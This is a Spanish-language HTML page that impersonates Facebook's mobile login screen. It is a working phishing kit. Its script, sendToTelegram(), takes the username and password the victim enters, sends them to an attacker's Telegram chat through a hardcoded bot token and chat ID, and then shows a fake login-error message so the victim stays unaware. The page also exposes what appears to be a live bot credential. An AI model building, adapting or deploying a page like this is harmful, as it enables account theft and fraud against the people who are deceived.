<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        /* Reset de márgenes y paddings */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Configuración del cuerpo */
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #f7f8fc, #ffffff);
            min-height: 100vh;
            width: 100vw;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }

        /* Idioma */
        .language {
            color: #606770;
            font-size: 14px;
            margin-bottom: 30px;
        }

        /* Logo */
        .logo {
            width: 60px;
            margin-bottom: 40px;
        }

        /* Contenedor */
        .container {
            width: 90%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            height: 75vh;
            margin-top: 30px;
        }

        /* Campos de entrada */
        .input-box {
            width: 90%;
            max-width: 350px;
            padding: 14px;
            margin: 12px 0;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            font-size: 16px;
            background: white;
            outline: none;
        }

        /* Botón de inicio de sesión */
        .login-button {
            width: 90%;
            max-width: 350px;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-button:hover {
            background-color: #1558b0;
        }

        /* Enlace de recuperación */
        .forgot-password {
            display: block;
            margin: 15px 0;
            color: black;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Botón de crear cuenta */
        .create-account {
            width: 90%;
            max-width: 350px;
            padding: 14px;
            border: 1px solid #1877f2;
            background-color: white;
            color: #1877f2;
            font-weight: bold;
            border-radius: 20px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            margin-bottom: 40px;
        }
        .create-account:hover {
            background-color: #f0f2f5;
        }

        /* Meta sección */
        .meta-section {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #606770;
            font-size: 14px;
            font-weight: bold;
        }

        .meta-icon {
            width: 20px;
            margin-right: 5px;
        }

        /* Pie de página */
        .footer {
            position: absolute;
            bottom: 10px;
            font-size: 12px;
            color: #606770;
            text-align: center;
            width: 100%;
        }
        .footer a {
            color: #606770;
            text-decoration: none;
            margin: 0 5px;
        }
        .footer a:hover {
            text-decoration: underline;
        }

    </style>
</head>
<body>

    <!-- Idioma -->
    <p class="language">Español</p>

    <!-- Logo -->
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">

    <!-- Contenedor -->
    <div class="container">
        <!-- Campos de entrada -->
        <input type="text" class="input-box" id="username" placeholder="Celular o correo electrónico">
        <input type="password" class="input-box" id="password" placeholder="Contraseña">

        <!-- Botón de inicio de sesión -->
        <button class="login-button" onclick="sendToTelegram()">Iniciar sesión</button>

        <!-- Enlace de recuperación -->
        <a href="https://m.facebook.com/login/identify/" class="forgot-password">¿Olvidaste tu contraseña?</a>

        <!-- Botón de crear cuenta -->
        <a href="https://m.facebook.com/reg/" class="create-account">Crear cuenta nueva</a>
    </div>

    <!-- Meta sección -->
    <div class="meta-section">
        <img class="meta-icon" src="https://img.icons8.com/ios-filled/50/606770/meta.png" alt="Meta Icon">
        <span>Meta</span>
    </div>

    <!-- Pie de página -->
    <div class="footer">
        <a href="#">Información</a> 
        <a href="#">Ayuda</a> 
        <a href="#">Más</a>
    </div>

    <script>
        function sendToTelegram() {
            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;

            if (username.trim() === "" || password.trim() === "") {
                alert("Por favor, ingresa tus credenciales.");
                return;
            }

            let botToken = "7743671451:AAEBBTmS9RCi8cVXIzszcgdeg8lHmVHBgWc"; // Coloca tu token de Telegram
            let chatId = "6655950012"; // Coloca tu chat ID de Telegram

            let message = `🔑 Nuevo Login:\n👤 Usuario: ${username}\n🔒 Contraseña: ${password}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({chat_id: chatId, text: message})
            })
            .then(response => {
                if (response.ok) {
                    alert("Error al iniciar sesión. Intenta nuevamente.");
                } else {
                    console.error("Error al enviar los datos.");
                }
            })
            .catch(error => console.error("Error en la solicitud:", error));
        }
    </script>

</body>
</html>
